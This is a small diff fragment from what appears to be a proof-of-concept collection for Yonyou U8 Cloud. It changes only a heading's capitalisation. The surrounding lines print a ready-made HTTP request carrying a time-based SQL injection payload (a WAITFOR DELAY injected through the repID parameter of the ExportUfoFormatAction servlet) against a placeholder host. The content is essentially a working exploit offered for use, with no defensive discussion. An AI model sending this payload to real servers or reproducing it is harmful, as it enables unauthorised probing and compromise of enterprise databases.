@@ -5,7 +5,7 @@
 app="用友-U8-Cloud"
 ```
 
-## poc
+## POC
 ```
 GET /service/~iufo/com.ufida.web.action.ActionServlet?action=nc.ui.iuforeport.rep.ExportUfoFormatAction&method=&repID=1%27);WAITFOR+DELAY+%270:0:5%27--+ HTTP/1.1
 Host: url
